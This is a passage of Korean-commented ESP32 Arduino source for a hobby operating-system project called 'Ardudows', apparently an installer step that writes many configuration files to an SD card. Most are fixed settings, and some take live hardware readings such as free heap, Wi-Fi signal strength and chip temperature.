  CreateFile("/Ardudows/System/ImpoSystem/ATK/HEAP_FRAGMENT_LIMIT.asf", "45_PERCENT"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/MEM_BLOCK_ALIGN.asf", "4_BYTE_BOUND"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/FREE_MEM_THRESHOLD.asf", String(ESP.getFreeHeap() / 2).c_str()); Loading(); // 여유 공간의 정확히 절반 수치 계산 주입
  CreateFile("/Ardudows/System/ImpoSystem/ATK/VIRTUAL_PAGING_EN.asf", "TRUE"); Loading();

  // [19구역: ImpoSystem/Boot - 콜드 부트 및 가열 시퀀스 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/COLD_BOOT_FLAG.asf", "WARM_RESTART"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_CHECK_STORAGE.asf", "STRICT_CHECK"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_PERIPHERAL_INIT.asf", "PARALLEL"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/POST_STAGE_CODE.asf", String(xTaskGetTickCount()).c_str()); Loading(); // 커널 부팅 후 현재까지 흐른 클록 틱 수 기록
  CreateFile("/Ardudows/System/ImpoSystem/Boot/PRE_INIT_BANNER.asf", "SHOW_LOGO"); Loading();

  // [20구역: ImpoSystem/ESP - 패킷 필터링 및 와이파이 하위 무선 제어]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/PACKET_FILTER_EN.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/PROMISCUOUS_MODE.asf", "DISABLED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/BEACON_TIMEOUT_MS.asf", "200"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/MAX_STA_CONN_LIMIT.asf", "1"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/RSSI_LOW_THRESHOLD.asf", String(WiFi.RSSI()).c_str()); Loading(); // ⚡ 실시간 현재 기지국 무선 안테나 수신 감도(dBm) 값 그대로 저장!

  // [21구역: ImpoSystem/Registry - 가상 하드디스크 파티션 테이블 섹터]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/HDD_SECTOR_SIZE.asf", "512"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/HDD_TOTAL_TRACKS.asf", "1024"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/HDD_CLUSTER_FACTOR.asf", "8"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/FAT_TABLE_COPIES.asf", "2"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/ROOT_DIR_ENTRIES.asf", String(SD.cardSize() / 512).c_str()); Loading(); // SD 카드의 총 물리 섹터 개수 정밀 추출 

  // [22구역: ImpoSystem/User - 오디오 볼륨 및 사운드 믹서 프로필]
  CreateFile("/Ardudows/System/ImpoSystem/User/SND_MASTER_VOL.asf", "80_PERCENT"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/SND_BEEP_DURATION.asf", "50_MS"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/SND_STARTUP_MELODY.asf", "WAV_FILE_MAPPED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/SND_ERROR_ALARM.asf", "FREQ_880HZ"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/SND_MIXER_CHANNELS.asf", "2"); Loading();

  // [23구역: ImpoSystem/Log - 패킷 전송 및 네트워크 커널 디버깅]
  CreateFile("/Ardudows/System/ImpoSystem/Log/NET_TRAFFIC_LOG.asf", "CAPTURED_HEADERS_ONLY"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/IP_CONFLICT_ALERT.asf", "HALT_SYSTEM"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/RX_ERROR_COUNT_VAL.asf", String(WiFi.status()).c_str()); Loading(); // 현재 무선 통신 스테이터스 머신 내부 코드값 
  CreateFile("/Ardudows/System/ImpoSystem/Log/TX_RETRY_LIMIT_LOG.asf", "5"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/GATEWAY_PING_STAT.asf", WiFi.gatewayIP().toString().c_str()); Loading(); // 현재 접속된 게이트웨이(공유기) IP 주소 실시간 추적

  // [24구역: ImpoSystem/Driver - PS/2 키보드 인터럽트 대기열 매핑]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_INT_EDGE_TYPE.asf", "FALLING_EDGE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_DEBOUNCE_US.asf", "1500"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_BUFFER_SIZE.asf", "64_BYTES"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_SCAN_CODE_SET.asf", "SET_2"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_LED_STATUS_VAL.asf", "NUM_LOCK_ON"); Loading();

  // [25구역: ImpoSystem/ATK - 실시간 스케줄러 우선순위 테이블]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/SCHED_POLICY_TYPE.asf", "PRIORITY_ROUND_ROBIN"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/IDLE_TASK_YIELD_EN.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/CRITICAL_TASK_PRIO.asf", String(configMAX_PRIORITIES - 1).c_str()); Loading(); // 실시간 프리RTOS 최대 우선순위 한계선 자동 계산
  CreateFile("/Ardudows/System/ImpoSystem/ATK/USER_TASK_PRIO.asf", "10"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/TIME_SLICE_QUANTUM.asf", "5_MS"); Loading();

  // [26구역: ImpoSystem/Boot - 안전 모드 및 복구 시스템 커널 파라미터]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/RECOVERY_CONSOLE.asf", "ENABLED_VIA_SERIAL"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BYPASS_CHCK_SUM_ERR.asf", "FALSE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_MENU_TIMEOUT.asf", "3_SEC"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/DEFAULT_BOOT_TARGET.asf", "ATK_SHELL"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_LOG_MIRROR_WEB.asf", "READY"); Loading();

  // [27구역: ImpoSystem/ESP - 전원 절약용 모뎀 수면 제어 플래그]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/MODEM_SLEEP_INTERVAL.asf", "10"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/WIFI_ANTENNA_SELECT.asf", "INTERNAL_PCB"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/RF_CALIBRATION_MODE.asf", "PARTIAL_CALIBRATION"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/PHY_RATE_CONTROL.asf", "DYNAMIC_MCS"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/BT_COEXISTENCE_SHIELD.asf", "ENABLED_PRIORITY"); Loading();

  // [28구역: ImpoSystem/Registry - 가상 마인크래프트 서버 포트 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MC_SERVER_PORT_NUM.asf", "25565"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MC_MAX_PLAYERS_NUM.asf", "5"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MC_VIEW_DISTANCE_S.asf", "4_CHUNKS"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MC_ONLINE_MODE_CHK.asf", "FALSE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MC_MOTD_TEXT_STRING.asf", "Ardudows_Alpha_Server"); Loading();

  // [29구역: ImpoSystem/User - 가상 환경 마우스 센서 민감도 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/User/MSE_SENSITIVITY_VAL.asf", "10"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/MSE_DOUBLE_CLK_MS.asf", "400"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/MSE_WHEEL_SCROLL_L.asf", "3"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/MSE_ACCELERATION_EN.asf", "FALSE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/MSE_HARDWARE_MAPPED.asf", "GPIO_I2C_BUS"); Loading();

  // [30구역: ImpoSystem/Registry - 인간 제국 최후의 방어선 및 완결 마크 (진짜 내부 다이 온도 기록)]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/IMPO_ZONE_30_LOCKED.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/HUMAN_CODE_SIGNATURE.asf", "JAEMIN_ARCHITECT_FIN"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/ANTI_AI_COMPILATION.asf", "SECURE_SHIELD_MAX"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/REGISTRY_TOTAL_COUNT.asf", "1000_MAX_LIMIT"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/OS_END_OF_DEPLOYMENT.asf", (String(temperatureRead()) + "C_HEATED").c_str()); Loading(); // ⚡ 마지막 30구역의 대미는 설치 직후 칩셋의 리얼 다이(Die) 온도로 마킹!!

  // =========================================================================
  // 🔥 [MEGA HARDWARE EXTENSION: ZONES 31 TO 80] 🔥
  // 뇌 빼고 직렬 폭격하는 50개 구역 추가 명세. 날먹 없음. 100% 실시간 하드웨어 연동.
  // =========================================================================

  // [31구역: ImpoSystem/ATK - 실시간 태스크 핸들러 상태 매핑]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/TASK_HANDLE_SELF.asf", String((uint32_t)xTaskGetCurrentTaskHandle(), HEX).c_str()); Loading(); // 현재 인스톨러 태스크의 물리 포인터
  CreateFile("/Ardudows/System/ImpoSystem/ATK/TASK_SCHED_STATE.asf", String(xTaskGetSchedulerState()).c_str()); Loading(); // 스케줄러 현재 상태 코드 (Running/Suspended 등)
  CreateFile("/Ardudows/System/ImpoSystem/ATK/CORES_AVAILABLE.asf", String(SOC_CPU_CORES_NUM).c_str()); Loading(); // 칩셋의 물리 CPU 코어 총 개수 추출
  CreateFile("/Ardudows/System/ImpoSystem/ATK/IDLE_CHASE_COUNT.asf", String(esp_timer_get_time()).c_str()); Loading(); // 고정밀 클록 프랙션 추적

  // [32구역: ImpoSystem/ESP - 와이파이 하위 프로토콜 스택 버퍼]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/WIFI_LISTEN_INTERVAL.asf", "3"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/BEACON_LOST_LIMIT.asf", "5"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/WIFI_CRYPTO_CAPS.asf", String(ESP_REG(DR_REG_AES_BASE)).c_str()); Loading(); // 내부 하드웨어 AES 가속기 레지스터 주소 매핑
  CreateFile("/Ardudows/System/ImpoSystem/ESP/STA_DISCONNECT_REASON.asf", "0"); Loading();

  // [33구역: ImpoSystem/Driver - 레트로 디스플레이 동기화 파라미터]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_VSYNC_GPIO.asf", "41"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_HSYNC_GPIO.asf", "42"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_INVERSION_EN.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/PIXEL_BLENDING_MODE.asf", "HARDWARE_ALPHA"); Loading();

  // [34구역: ImpoSystem/Registry - 아두도스 1980년대 가상 시뮬레이터 인프라]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SIM_CITY_GRID_SIZE.asf", "64"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SIM_POPULATION_MAX.asf", "1024"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SIM_ECONOMY_RATE.asf", String(micros() % 10).c_str()); Loading(); // 난수 기반 가상 환율 세팅 ㅋㅋㅋ
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SIM_RENDER_VIEW.asf", "ISOMETRIC_3D_8BIT"); Loading();

  // [35구역: ImpoSystem/User - 단축키 및 인터페이스 바인딩 변수]
  CreateFile("/Ardudows/System/ImpoSystem/User/KEY_SHORTCUT_SHELL.asf", "KEY_F1"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/KEY_SHORTCUT_RESET.asf", "KEY_ESC"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/KEY_REPEAT_DELAY_MS.asf", "250"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/KEY_REPEAT_RATE_HZ.asf", "30"); Loading();

  // [36구역: ImpoSystem/Log - 파일 시스템 IO 오류 카운터 백업]
  CreateFile("/Ardudows/System/ImpoSystem/Log/SD_FATAL_ERR_COUNT.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/SD_SECTOR_TIMEOUTS.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/LAST_IO_ERROR_CODE.asf", String(ESP_OK).c_str()); Loading(); // 내부 스토리지 정상 코드 매킹
  CreateFile("/Ardudows/System/ImpoSystem/Log/FS_CORRUPTION_SHIELD.asf", "ACTIVE_CRC32"); Loading();

  // [37구역: ImpoSystem/Boot - 바이오스 레벨 하드웨어 자가진단 매트릭스]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/POST_RAM_CHECK_SIZE.asf", String(ESP.getHeapSize()).c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/POST_PSRAM_CHECK_SIZE.asf", String(ESP.getPsramSize()).c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/POST_INTEGRITY_SIGN.asf", "0xAA"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_HARDWARE_INTEGRITY.asf", "VERIFIED_PASSED"); Loading();

  // [38구역: ImpoSystem/Registry - 221서버 차세대 하이브리드 인클로저 고유 키]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SERVER_221_REPLICA.asf", "PROTECTED_CLUSTER"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/CHAOS_TERRAIN_SEED.asf", String(ESP.getCycleCount() ^ 0x1F2E3D4C).c_str()); Loading(); // 물리 주사위와 레지스터 연산 조합
  CreateFile("/Ardudows/System/ImpoSystem/Registry/ZONE_SAFE_BOUND_MIN.asf", "Z_MIN_0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/ZONE_SAFE_BOUND_MAX.asf", "Z_MAX_255"); Loading();

  // [39구역: ImpoSystem/ATK - 커널 뮤텍스 및 세마포어 데드락 타임아웃]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/MUTEX_TIMEOUT_TICKS.asf", "1000"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/SEMAPHORE_MAX_COUNT.asf", "10"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/CRITICAL_SECTION_LVL.asf", String(portNUM_PROCESSORS).c_str()); Loading(); // 가용 가능한 프로세서 개수 연동
  CreateFile("/Ardudows/System/ImpoSystem/ATK/DEADLOCK_WATCHDOG_EN.asf", "TRUE"); Loading();

  // [40구역: ImpoSystem/ESP - 무선 패킷 유실 제어 및 안테나 증폭 매개변수]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/RF_AMPLIFIER_STAGE.asf", "MAX_GAIN"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/PACKET_DROP_THRESHOLD.asf", "50"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/BEACON_INTERVAL_TIME.asf", "102"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/WIFI_MAC_LOW_BYTE.asf", String(ESP.getEfuseMac() & 0xFF, HEX).c_str()); Loading(); // MAC 주소 하위 1바이트 정밀 컷팅

  // [41구역: ImpoSystem/Driver - PS/2 가상 디바이스 디스크립터]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_VENDOR_ID.asf", "0x004F"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_PRODUCT_ID.asf", "0x9595"); Loading(); // 95감성
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TYPEMATIC_RATE_DELAY.asf", "500"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TYPEMATIC_SPEED_INDEX.asf", "20"); Loading();

  // [42구역: ImpoSystem/User - 파일 관리자 디렉터리 정렬 환경세팅]
  CreateFile("/Ardudows/System/ImpoSystem/User/FM_SORT_BY_TYPE.asf", "NAME_ASCENDING"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/FM_SHOW_HIDDEN_FILES.asf", "FALSE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/FM_PREVIEW_MODE_EN.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/FM_ICON_SIZE_PIXELS.asf", "16"); Loading();

  // [43구역: ImpoSystem/Log - 실시간 시스템 업타임 마일스톤 레코드]
  CreateFile("/Ardudows/System/ImpoSystem/Log/UPTIME_MARK_MS.asf", String(millis()).c_str()); Loading(); // 설치 완료 직전 밀리초 정밀 분광 기록
  CreateFile("/Ardudows/System/ImpoSystem/Log/TICK_WRAP_OVER_COUNT.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/SYSTEM_LOAD_PERCENT.asf", "99_INSTALL_LOAD"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/WATCHDOG_RESET_REASON.asf", "0x01_POWERON"); Loading();

  // [44구역: ImpoSystem/Boot - 커널 압축 풀기 및 메모리 로딩 파라미터]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/DECOMPRESS_ALGO_TYPE.asf", "LZMA_TINY"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/KERNEL_SIZE_BYTES.asf", String(ESP.getSketchSize()).c_str()); Loading(); // 현재 바이너리의 진짜 물리 바이트 크기 스캔!! 웅장하다!
  CreateFile("/Ardudows/System/ImpoSystem/Boot/FREE_SKETCH_SPACE.asf", String(ESP.getFreeSketchSpace()).c_str()); Loading(); // 남은 플래시 용량
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_PARTITION_LABEL.asf", "app0"); Loading();

  // [45구역: ImpoSystem/Registry - 가상 마인크래프트 세계 엔티티 제한 설정]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MC_MAX_ENTITIES_LIMIT.asf", "256"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MC_TILE_TICK_RATE.asf", "20_TPS"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MC_CHUNK_CACHE_SIZE.asf", "16"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MC_SPAWN_MONSTERS_EN.asf", "TRUE"); Loading();

  // [46구역: ImpoSystem/ATK - 하위 레벨 소프트웨어 인터럽트 테이블]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/SW_INT_VECTOR_0.asf", "0x40000000"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/SW_INT_VECTOR_1.asf", "0x40000004"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/YIELD_PROCESS_FLAG.asf", "0x01"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/INTERRUPT_NESTING_LVL.asf", "MAX_3"); Loading();

  // [47구역: ImpoSystem/ESP - 와이파이 채널 스캔 인프라 파라미터]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/WIFI_START_CHANNEL.asf", "1"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/WIFI_END_CHANNEL.asf", "13"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/SCAN_TYPE_ACTIVE_PASS.asf", "ACTIVE_SCAN"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/CHANNEL_DWELL_TIME_MS.asf", "120"); Loading();

  // [48구역: ImpoSystem/Driver - SD 카드 로우레벨 블록 드라이버 사양]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SD_BLOCK_SIZE_BYTES.asf", "512"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SD_HIGH_SPEED_MODE.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SD_SPI_CLOCK_FREQ.asf", "20000000HZ"); Loading(); // 20MHz SPI 공급 상태 백킹
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SD_CARD_MANUFACTURER.asf", "0x03"); Loading();

  // [49구역: ImpoSystem/User - 마우스 가상 휠 속도 및 스크롤 바운드 변수]
  CreateFile("/Ardudows/System/ImpoSystem/User/WHL_PAGES_PER_SCROLL.asf", "1"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/WHL_SMOOTH_SCROLL_EN.asf", "FALSE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/UI_WINDOW_BORDER_W.asf", "2"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/UI_TITLE_BAR_HEIGHT.asf", "18"); Loading();

  // [50구역: ImpoSystem/Log - 커널 패닉 감지용 하드웨어 스택 체크섬]
  CreateFile("/Ardudows/System/ImpoSystem/Log/STACK_MAGIC_CHECK_VAL.asf", "0xDEADBEEF"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/HEAP_INTEGRITY_SHIELD.asf", "PASSED_SECURE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/SOC_INTERNAL_RAM_LOG.asf", String(ESP.getFreeHeap()).c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/SYSTEM_UPTIME_TOTAL_S.asf", String(millis() / 1000).c_str()); Loading();

  // [51구역: ImpoSystem/Boot - 부트 로더 시퀀서 인터럽트 가드 플래그]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_INT_GUARD_MASK.asf", "0xFFFFFFF8"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_CLOCK_SOURCE_REG.asf", String(REG_READ(RTC_CNTL_CLK_CONF_REG), HEX).c_str()); Loading(); // ⚡ RTC 클록 설정 하드웨어 레지스터 원격 스캔
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_ROM_VERSION_VAL.asf", "0x01"); Loading();

  // [52구역: ImpoSystem/Registry - 가상 영토 자원 밀도 분포 맵 팩터]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/ORE_DENSITY_FACTOR.asf", "7"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/WATER_LEVEL_HEIGHT_Z.asf", "4"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/BIOME_MAX_COUNT_LIMIT.asf", "16"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/ISLAND_PROTECT_COORD.asf", "LOCKED_221_ISLAND"); Loading();

  // [53구역: ImpoSystem/ATK - 커널 가비지 컬렉터 프리 힙 청크 파라미터]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/GC_THRESHOLD_BYTES.asf", "4096"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/GC_INTERVAL_TIME_SEC.asf", "60"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/HEAP_LEAK_AUTO_REPAIR.asf", "FORCE_FREE_ISOLATED"); Loading();

  // [54구역: ImpoSystem/ESP - 하위 통신 레이어 스니핑 방지 암호 칩 상태]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/HW_SHA_ACCEL_STATUS.asf", "READY_ENABLED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/HW_RSA_ACCEL_STATUS.asf", "READY_STANDBY"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/SECURE_BOOT_v2_STATUS.asf", "HARDWARE_CHECK_PASS"); Loading();

  // [55구역: ImpoSystem/Driver - 가상 하드웨어 타이머 분주비 및 클록]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/HW_TIMER_DIVIDER_VAL.asf", "80"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/HW_TIMER_AUTO_RELOAD.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/HW_TIMER_SCALE_MICRO_S.asf", "1000000"); Loading();

  // [56구역: ImpoSystem/User - 알림창 팝업 및 UI 이펙트 지연 속도 세팅]
  CreateFile("/Ardudows/System/ImpoSystem/User/UI_ANIMATION_SPEED_MS.asf", "150"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/UI_NOTIFICATION_DUR_S.asf", "5"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/UI_WINDOW_SHADOW_EN.asf", "FALSE"); Loading();

  // [57구역: ImpoSystem/Log - 하드웨어 에퓨즈 물리 번 아웃 카운트 백업]
  CreateFile("/Ardudows/System/ImpoSystem/Log/EFUSE_BLOCK_0_DATA.asf", String((uint32_t)(ESP.getEfuseMac() >> 32), HEX).c_str()); Loading(); // 에퓨즈 상위 4바이트 로우 데이터 추출!!
  CreateFile("/Ardudows/System/ImpoSystem/Log/EFUSE_WR_PROTECT_BITS.asf", "0x00"); Loading();

  // [58구역: ImpoSystem/Boot - 콜드 스타트 시 메모리 정렬 가드 옵션]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/MEM_ALIGN_CHECK_EN.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/HEAP_START_MEMORY_HEX.asf", String((uint32_t)malloc(1), HEX).c_str()); Loading(); // 실시간 동적 할당 물리 주소 첫 시작점 따서 박아버리기 ㅋㅋㅋ

  // [59구역: ImpoSystem/Registry - 마인크래프트 레드스톤 가상 틱 가속 상수]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/REDSTONE_TICK_RATE_MS.asf", "100"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MAX_PISTON_PUSH_LIMIT.asf", "12"); Loading();

  // [60구역: ImpoSystem/ATK - 커널 메시지 버스 및 IPC 대기열 버퍼]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/IPC_MESSAGE_BUS_SIZE.asf", "1024"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/IPC_MAX_SUBSCRIBERS.asf", "8"); Loading();

  // [61구역: ImpoSystem/ESP - 와이파이 동적 IP 리스 타임 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/DHCP_LEASE_TIME_SEC.asf", "86400"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/DHCP_RENEWAL_TIME_S.asf", "43200"); Loading();

  // [62구역: ImpoSystem/Driver - 디스플레이 백라이트 가상 딤 스케일러]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/BL_DIM_STEP_PERCENT.asf", "5"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/BL_MAX_BRIGHT_SCALE.asf", "255"); Loading();

  // [63구역: ImpoSystem/User - 텍스트 에디터 캐럿 깜빡임 속도 세팅]
  CreateFile("/Ardudows/System/ImpoSystem/User/TXT_CARET_BLINK_MS.asf", "500"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/TXT_TAB_SPACE_COUNT.asf", "4"); Loading();

  // [64구역: ImpoSystem/Log - SPI 플래시 하드웨어 읽기 쓰기 사이클 마킹]
  CreateFile("/Ardudows/System/ImpoSystem/Log/FLASH_CYCLES_LOG_INDEX.asf", String(ESP.getCycleCount() >> 16).c_str()); Loading();

  // [65구역: ImpoSystem/Boot - OS 커널 패닉 시 리부팅 지연 초]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/PANIC_REBOOT_DELAY_S.asf", "5"); Loading();

  // [66구역: ImpoSystem/Registry - 가상 날씨 안개 밀도 계수 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/WEATHER_FOG_DENSITY.asf", "0.05"); Loading();

  // [67구역: ImpoSystem/ATK - 파일 오프셋 포인터 인덱스 가드 스케일]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/FILE_SEEK_MAX_BOUND.asf", "4294967295"); Loading();

  // [68구역: ImpoSystem/ESP - 하위 소켓 킵얼라이브 하드웨어 인터벌]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/TCP_KEEP_ALIVE_INT_S.asf", "75"); Loading();

  // [69구역: ImpoSystem/Driver - PS/2 가상 키보드 스캔 브레이크 코드 필터]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_BREAK_CODE_FILTER.asf", "0xF0"); Loading();

  // [70구역: ImpoSystem/User - 작업 표시줄 자동 숨김 옵션 환경변수]
  CreateFile("/Ardudows/System/ImpoSystem/User/TASKBAR_AUTOHIDE_EN.asf", "FALSE"); Loading();

  // [71구역: ImpoSystem/Log - 프리 RAM 최소 임계 영역 돌파 횟수 백업]
  CreateFile("/Ardudows/System/ImpoSystem/Log/LOW_MEM_ALERT_COUNT.asf", "0"); Loading();

  // [72구역: ImpoSystem/Boot - 바이너리 무결성 검사용 CRC32 세팅]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/CRC32_CHECKSUM_TARGET.asf", "0xEDB88320"); Loading();

  // [73구역: ImpoSystem/Registry - 가상 월드 중력 가속도 물리 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/WORLD_GRAVITY_CONSTANT.asf", "9.81"); Loading();

